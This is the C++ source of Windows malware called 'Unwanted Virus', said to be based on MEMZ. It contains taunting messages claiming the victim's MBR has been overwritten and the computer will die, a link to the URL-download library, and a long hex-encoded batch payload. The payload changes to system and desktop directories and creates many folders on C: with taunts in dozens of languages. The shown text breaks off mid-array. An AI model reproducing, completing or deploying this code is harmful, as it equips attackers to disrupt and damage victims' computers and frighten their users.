/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x20, 0x25, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x25, 0x20, 0x26, 0x20,
0x65, 0x63, 0x68, 0x6F, 0x2E, 0x20, 0x0D, 0x0A, 0x63, 0x64, 0x20, 0x25, 0x75, 0x73, 0x65, 0x72,
0x70, 0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65, 0x25, 0x5C, 0x64, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x79, 0x6F,
0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x20,
0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6A, 0x61,
0x6A, 0x61, 0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x6D, 0x65, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73,
0x20, 0x71, 0x75, 0x69, 0x74, 0x61, 0x72, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22,
0x43, 0x3A, 0x20, 0xD0, 0xBB, 0xD0, 0xBE, 0xD0, 0xBB, 0x2C, 0x20, 0xD1, 0x82, 0xD1, 0x8B, 0x20,
0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0, 0xB5, 0xD1, 0x88, 0xD1,
0x8C, 0x20, 0xD0, 0xBC, 0xD0, 0xB5, 0xD0, 0xBD, 0xD1, 0x8F, 0x20, 0xD1, 0x83, 0xD0, 0xB4, 0xD0,
0xB0, 0xD0, 0xBB, 0xD0, 0xB8, 0xD1, 0x82, 0xD1, 0x8C, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x6E, 0x69, 0x65, 0x20, 0x6D,
0x6F, 0xC5, 0xBC, 0x65, 0x73, 0x7A, 0x20, 0x6D, 0x6E, 0x69, 0x65, 0x20, 0x75, 0x73, 0x75, 0x6E,
0xC4, 0x85, 0xC4, 0x87, 0x20, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43,
0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x20, 0x6E, 0x6F, 0x6E, 0x20, 0x70, 0x75, 0x6F, 0x69, 0x20, 0x63,
0x61, 0x6E, 0x63, 0x65, 0x6C, 0x6C, 0x61, 0x72, 0x6D, 0x69, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x76, 0x69, 0x20, 0x6E,
0x65, 0x20, 0x70, 0x6F, 0x76, 0x61, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x20, 0x6D,
0x69, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F,
0x4C, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x67, 0x65,
0x74, 0x20, 0x72, 0x69, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4A, 0x41, 0x4A, 0x61, 0x2C, 0x20, 0x6E, 0x6F, 0x20,
0x6D, 0x65, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65,
0x72, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C,
0x20, 0x76, 0x6F, 0x63, 0xC3, 0xAA, 0x20, 0x6E, 0xC3, 0xA3, 0x6F, 0x20, 0x70, 0x6F, 0x64, 0x65,
0x20, 0x73, 0x65, 0x20, 0x6C, 0x69, 0x76, 0x72, 0x61, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x69,
0x6D, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C,
0x20, 0x76, 0x6F, 0x73, 0x20, 0x6E, 0x6F, 0x20, 0x74, 0x65, 0x20, 0x70, 0x6F, 0x64, 0x65, 0x73,
0x20, 0x6C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x69, 0x20, 0x5C, 0x22,
0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0xCE,
0xB4, 0xCE, 0xB5, 0xCE, 0xBD, 0x20, 0xCE, 0xBC, 0xCF, 0x80, 0xCE, 0xBF, 0xCF, 0x81, 0xCE, 0xB5,
0xCE, 0xAF, 0xCF, 0x82, 0x20, 0xCE, 0xBD, 0xCE, 0xB1, 0x20, 0xCE, 0xBC, 0xCE, 0xB5, 0x20, 0xCE,
0xB1, 0xCF, 0x80, 0xCE, 0xB1, 0xCE, 0xBB, 0xCE, 0xBB, 0xCE, 0xB1, 0xCE, 0xB3, 0xCE, 0xB5, 0xCE,
0xAF, 0xCF, 0x82, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20,
0x64, 0x6F, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x73, 0x65, 0x65, 0x20, 0x69, 0x74, 0x2C, 0x20, 0x6E,
0x6F, 0x20, 0x6D, 0x65, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x74, 0x75, 0x20, 0x6E, 0x65, 0x20, 0x70,
0x65, 0x75, 0x78, 0x20, 0x70, 0x61, 0x73, 0x20, 0x74, 0x65, 0x20, 0x64, 0xC3, 0xA9, 0x62, 0x61,
0x72, 0x72, 0x61, 0x73, 0x73, 0x65, 0x72, 0x20, 0x64, 0x65, 0x20, 0x6D, 0x6F, 0x69, 0x20, 0x5C,
0x22, 0x20, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x20, 0x43,
0x41, 0x4E, 0x4E, 0x4F, 0x54, 0x20, 0x52, 0x45, 0x4D, 0x4F, 0x56, 0x45, 0x20, 0x4D, 0x45, 0x20,
0x48, 0x41, 0x48, 0x41, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xC3, 0x9D, 0xC3, 0x93, 0xC3, 0x9B, 0x20,
0xC3, 0x87, 0xC3, 0x82, 0x4E, 0x4E, 0xC3, 0x93, 0x54, 0x20, 0x52, 0xC3, 0x89, 0x4D, 0xC3, 0x93,
0x56, 0xC3, 0x89, 0x20, 0x4D, 0xC3, 0x89, 0x20, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0xC3, 0x82,
0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x48, 0xC3, 0x82, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x57, 0xC3, 0x89, 0x20, 0xC3, 0x82, 0x52, 0xC3,
0x89, 0x20, 0x54, 0x48, 0xC3, 0x89, 0x20, 0xC3, 0x9F, 0xC3, 0x89, 0xC2, 0xA7, 0x54, 0x20, 0xC3,
0x8C, 0xC2, 0xA7, 0x4E, 0x54, 0x20, 0xC3, 0x8C, 0x54, 0x20, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x57, 0x54, 0x46, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44,
0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20,
0x6D, 0x6F, 0x76, 0x65, 0x20, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x63, 0x79, 0x63,
0x6C, 0x65, 0x20, 0x62, 0x69, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63,
0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x64, 0x75, 0x20, 0x6B, 0x61, 0x6E, 0x6E, 0x73, 0x74,
0x20, 0x6D, 0x69, 0x63, 0x68, 0x20, 0x6E, 0x69, 0x63, 0x68, 0x74, 0x20, 0x6C, 0x6F, 0x73, 0x77,
0x65, 0x72, 0x64, 0x65, 0x6E, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A,
0x20, 0x69, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x20,
0x66, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x73, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0xE5, 0xA4, 0xA7, 0xE5, 0xA3, 0xB0, 0xE7,
0xAC, 0x91, 0xEF, 0xBC, 0x8C, 0xE4, 0xBD, 0xA0, 0xE4, 0xB8, 0x8D, 0xE8, 0x83, 0xBD, 0xE6, 0x91,
0x86, 0xE8, 0x84, 0xB1, 0xE6, 0x88, 0x91, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22,
0x43, 0x3A, 0x20, 0x4C, 0x6F, 0x6C, 0x2C, 0x20, 0x62, 0x65, 0x6E, 0x64, 0x65, 0x6E, 0x20, 0x6B,
0x75, 0x72, 0x74, 0x75, 0x6C, 0x61, 0x6D, 0x61, 0x7A, 0x73, 0xC4, 0xB1, 0x6E, 0x20, 0x5C, 0x22,
0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F, 0x4C, 0x2C, 0x20, 0x6E, 0x6F,
0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x72, 0x6D,
0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4C, 0x4F, 0x4C,
0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73, 0x20, 0x71, 0x75, 0x69, 0x74,
0x61, 0x72, 0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20,
0x4C, 0x6F, 0x6C, 0x2C, 0x20, 0x6A, 0x65, 0x20, 0x6B, 0x75, 0x6E, 0x74, 0x20, 0x6D, 0x65, 0x20,
0x6E, 0x69, 0x65, 0x74, 0x20, 0x56, 0x45, 0x52, 0x57, 0x49, 0x4A, 0x44, 0x45, 0x52, 0x45, 0x4E,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x75, 0x6E, 0x63,
0x61, 0x20, 0x6D, 0x65, 0x20, 0x70, 0x6F, 0x64, 0x72, 0x61, 0x73, 0x20, 0x71, 0x75, 0x69, 0x74,
0x61, 0x72, 0x20, 0x4A, 0x41, 0x4A, 0x41, 0x41, 0x4A, 0x41, 0x4A, 0x41, 0x4A, 0x41, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63, 0x61,
0x6E, 0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x20, 0x6D,
0x65, 0x20, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4F, 0x48, 0x20, 0x53, 0x55, 0x52,
0x50, 0x52, 0x49, 0x53, 0x45, 0x44, 0x20, 0x51, 0x55, 0x45, 0x53, 0x54, 0x49, 0x4F, 0x4E, 0x20,
0x4D, 0x41, 0x52, 0x4B, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20,
0x6F, 0x68, 0x2C, 0x20, 0x74, 0x68, 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x20,
0x65, 0x73, 0x63, 0x61, 0x70, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x68,
0x75, 0x68, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6F, 0x68,
0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x68, 0x61, 0x79, 0x20, 0x65, 0x73, 0x63, 0x61, 0x70, 0x65, 0x20,
0x70, 0x61, 0x72, 0x61, 0x20, 0x65, 0x73, 0x74, 0x6F, 0x20, 0x6A, 0x61, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6F, 0x68, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x72,
0x20, 0x64, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70, 0x20, 0x69, 0x73, 0x20, 0x66, 0x69, 0x6C, 0x6C,
0x65, 0x64, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x65,
0x76, 0x65, 0x72, 0x20, 0x65, 0x76, 0x65, 0x72, 0x20, 0x69, 0x6E, 0x20, 0x6C, 0x69, 0x66, 0x65,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6E, 0x6F, 0x6F, 0x69,
0x74, 0x20, 0x69, 0x6E, 0x20, 0x68, 0x65, 0x74, 0x20, 0x6C, 0x65, 0x76, 0x65, 0x6E, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x75, 0x6E, 0x63, 0x61, 0x20,
0x6A, 0x61, 0x6D, 0x61, 0x73, 0x20, 0x65, 0x6E, 0x20, 0x6C, 0x61, 0x20, 0x76, 0x69, 0x64, 0x61,
0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0, 0xBD, 0xD0, 0xB8,
0xD0, 0xBA, 0xD0, 0xBE, 0xD0, 0xB3, 0xD0, 0xB4, 0xD0, 0xB0, 0x20, 0xD0, 0xB2, 0x20, 0xD0, 0xB6,
0xD0, 0xB8, 0xD0, 0xB7, 0xD0, 0xBD, 0xD0, 0xB8, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x43, 0x3A, 0x20, 0xCF, 0x80, 0xCE, 0xBF, 0xCF, 0x84, 0xCE, 0xAD, 0x20, 0xCF, 0x83, 0xCF,
0x84, 0xCE, 0xB7, 0x20, 0xCE, 0xB6, 0xCF, 0x89, 0xCE, 0xAE, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x6A, 0x61, 0x6A, 0x73, 0x6A, 0x64, 0x73, 0x6A, 0x64, 0x6A,
0x73, 0x6A, 0x73, 0x6A, 0x66, 0x73, 0x64, 0x6A, 0x66, 0x6A, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x68, 0x61, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x68, 0x61,
0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x68, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x77, 0x68, 0x6F, 0x20, 0x61, 0x72, 0x65, 0x20, 0x79, 0x6F,
0x75, 0x2C, 0x20, 0x69, 0x20, 0x64, 0x6F, 0x6E, 0x74, 0x20, 0x6B, 0x6E, 0x6F, 0x77, 0x20, 0x72,
0x75, 0x6E, 0x20, 0x77, 0x68, 0x6F, 0x61, 0x6D, 0x69, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61,
0x6D, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0, 0xB0, 0xD0,
0xBC, 0xD1, 0x8C, 0xD0, 0xB4, 0xD1, 0x80, 0xD0, 0xB0, 0xD0, 0xBB, 0xD0, 0xB4, 0x20, 0xD1, 0x85,
0xD1, 0x8D, 0xD0, 0xB7, 0xD1, 0x8D, 0xD1, 0x8D, 0x20, 0xD1, 0x87, 0x20, 0xD1, 0x85, 0xD1, 0x8D,
0xD0, 0xB7, 0xD1, 0x8D, 0xD1, 0x8D, 0x20, 0xD1, 0x87, 0x20, 0x28, 0x69, 0x20, 0x6D, 0x65, 0x61,
0x6E, 0x29, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x48, 0x61,
0x79, 0x61, 0x74, 0x74, 0x61, 0x20, 0x61, 0x73, 0x6C, 0x61, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D,
0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE6, 0xB0, 0xB8, 0xE6, 0x97, 0xA0, 0xE4, 0xB8, 0x80, 0xE7,
0x94, 0x9F, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E, 0x6F,
0x6F, 0x69, 0x74, 0x20, 0x69, 0x6E, 0x20, 0x64, 0x69, 0x65, 0x20, 0x6C, 0x65, 0x77, 0x65, 0x20,
0x6E, 0x69, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6E,
0x69, 0x65, 0x6D, 0x61, 0x6C, 0x73, 0x20, 0x69, 0x6D, 0x20, 0x4C, 0x65, 0x62, 0x65, 0x6E, 0x20,
0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x49, 0x6E, 0x6F, 0x69, 0x7A,
0x20, 0x65, 0x7A, 0x20, 0x62, 0x69, 0x7A, 0x69, 0x74, 0x7A, 0x61, 0x6E, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0x4E, 0x75, 0x6E, 0x71, 0x75, 0x61, 0x6D, 0x20,
0x49, 0x6E, 0x20, 0x76, 0x69, 0x74, 0x61, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20,
0x22, 0x63, 0x3A, 0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x69, 0x6E, 0x20, 0x79, 0x6F, 0x75,
0x72, 0x20, 0x6C, 0x69, 0x66, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43,
0x3A, 0x20, 0x42, 0x4F, 0x52, 0x49, 0x4E, 0x47, 0x20, 0x54, 0x59, 0x50, 0x49, 0x4E, 0x47, 0x20,
0x54, 0x48, 0x49, 0x53, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20,
0xE1, 0x8B, 0xAD, 0xE1, 0x88, 0x85, 0xE1, 0x8A, 0x95, 0xE1, 0x8A, 0x95, 0x20, 0xE1, 0x88, 0x9B,
0xE1, 0x88, 0xB5, 0xE1, 0x8B, 0x88, 0xE1, 0x8C, 0x88, 0xE1, 0x8B, 0xB5, 0x20, 0xE1, 0x8A, 0xA0,
0xE1, 0x8B, 0xAD, 0xE1, 0x89, 0xBD, 0xE1, 0x88, 0x89, 0xE1, 0x88, 0x9D, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A, 0x20, 0xD4, 0xB4, 0xD5, 0xB8, 0xD6, 0x82, 0xD6, 0x84,
0x20, 0xD5, 0xB9, 0xD5, 0xA5, 0xD6, 0x84, 0x20, 0xD5, 0xAF, 0xD5, 0xA1, 0xD6, 0x80, 0xD5, 0xB8,
0xD5, 0xB2, 0x20, 0xD5, 0xBD, 0xD5, 0xA1, 0x20, 0xD5, 0xB0, 0xD5, 0xA1, 0xD5, 0xB6, 0xD5, 0xA5,
0xD5, 0xAC, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x42, 0x75,
0x6E, 0x75, 0x20, 0x73, 0x69, 0x6C, 0xC9, 0x99, 0x20, 0x62, 0x69, 0x6C, 0x6D, 0xC9, 0x99, 0x7A,
0x73, 0x69, 0x6E, 0x69, 0x7A, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x63, 0x3A,
0x20, 0xE0, 0xA6, 0x86, 0xE0, 0xA6, 0xAA, 0xE0, 0xA6, 0xA8, 0xE0, 0xA6, 0xBF, 0x20, 0xE0, 0xA6,
0x8F, 0xE0, 0xA6, 0x9F, 0xE0, 0xA6, 0xBF, 0xE0, 0xA6, 0x95, 0xE0, 0xA7, 0x87, 0x20, 0xE0, 0xA6,
0xB8, 0xE0, 0xA6, 0xB0, 0xE0, 0xA6, 0xBE, 0xE0, 0xA6, 0xA4, 0xE0, 0xA7, 0x87, 0x20, 0xE0, 0xA6,
0xAA, 0xE0, 0xA6, 0xBE, 0xE0, 0xA6, 0xB0, 0xE0, 0xA6, 0xAC, 0xE0, 0xA7, 0x87, 0xE0, 0xA6, 0xA8,
0x20, 0xE0, 0xA6, 0xA8, 0xE0, 0xA6, 0xBE, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22,
0x63, 0x3A, 0x20, 0xD0, 0x92, 0xD1, 0x8B, 0x20, 0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0,
0xBE, 0xD0, 0xB6, 0xD0, 0xB0, 0xD1, 0x86, 0xD0, 0xB5, 0x20, 0xD0, 0xB2, 0xD1, 0x8B, 0xD0, 0xB4,
0xD0, 0xB0, 0xD0, 0xBB, 0xD1, 0x96, 0xD1, 0x86, 0xD1, 0x8C, 0x20, 0xD0, 0xB3, 0xD1, 0x8D, 0xD1,
0x82, 0xD0, 0xB0, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0,
0x9D, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0, 0xB5, 0xD1, 0x82, 0xD0, 0xB5,
0x20, 0xD0, 0xB4, 0xD0, 0xB0, 0x20, 0xD0, 0xBF, 0xD1, 0x80, 0xD0, 0xB5, 0xD0, 0xBC, 0xD0, 0xB0,
0xD1, 0x85, 0xD0, 0xBD, 0xD0, 0xB5, 0xD1, 0x82, 0xD0, 0xB5, 0x20, 0xD1, 0x82, 0xD0, 0xBE, 0xD0,
0xB2, 0xD0, 0xB0, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xD0,
0x92, 0xD1, 0x8B, 0x20, 0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0,
0xB5, 0xD1, 0x82, 0xD0, 0xB5, 0x20, 0xD1, 0x83, 0xD0, 0xB4, 0xD0, 0xB0, 0xD0, 0xBB, 0xD0, 0xB8,
0xD1, 0x82, 0xD1, 0x8C, 0x20, 0xD1, 0x8D, 0xD1, 0x82, 0xD0, 0xBE, 0x20, 0x5C, 0x22, 0x0D, 0x0A,
0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xE6, 0x82, 0xA8, 0xE6, 0x97, 0xA0, 0xE6, 0xB3, 0x95,
0xE5, 0x88, 0xA0, 0xE9, 0x99, 0xA4, 0xE6, 0xAD, 0xA4, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64,
0x20, 0x22, 0x63, 0x3A, 0x20, 0xE0, 0xB6, 0x94, 0xE0, 0xB6, 0xB6, 0xE0, 0xB6, 0xA7, 0x20, 0xE0,
0xB6, 0xB8, 0xE0, 0xB7, 0x99, 0xE0, 0xB6, 0xBA, 0x20, 0xE0, 0xB6, 0x89, 0xE0, 0xB7, 0x80, 0xE0,
0xB6, 0xAD, 0xE0, 0xB7, 0x8A, 0x20, 0xE0, 0xB6, 0x9A, 0xE0, 0xB7, 0x85, 0x20, 0xE0, 0xB6, 0xB1,
0xE0, 0xB7, 0x9C, 0xE0, 0xB7, 0x84, 0xE0, 0xB7, 0x90, 0xE0, 0xB6, 0x9A, 0x20, 0x5C, 0x22, 0x0D,
0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0xEC, 0x9D, 0xB4, 0xEA, 0xB2, 0x83, 0xEC, 0x9D,
0x84, 0x20, 0xEC, 0xA0, 0x9C, 0xEA, 0xB1, 0xB0, 0x20, 0xED, 0x95, 0xA0, 0x20, 0xEC, 0x88, 0x98,
0x20, 0xEC, 0x97, 0x86, 0xEC, 0x8A, 0xB5, 0xEB, 0x8B, 0x88, 0xEB, 0x8B, 0xA4, 0x2E, 0x20, 0x5C,
0x22, 0x0D, 0x0A, 0x4D, 0x44, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x4E, 0x65, 0x20, 0x6D, 0x6F, 0xC5,
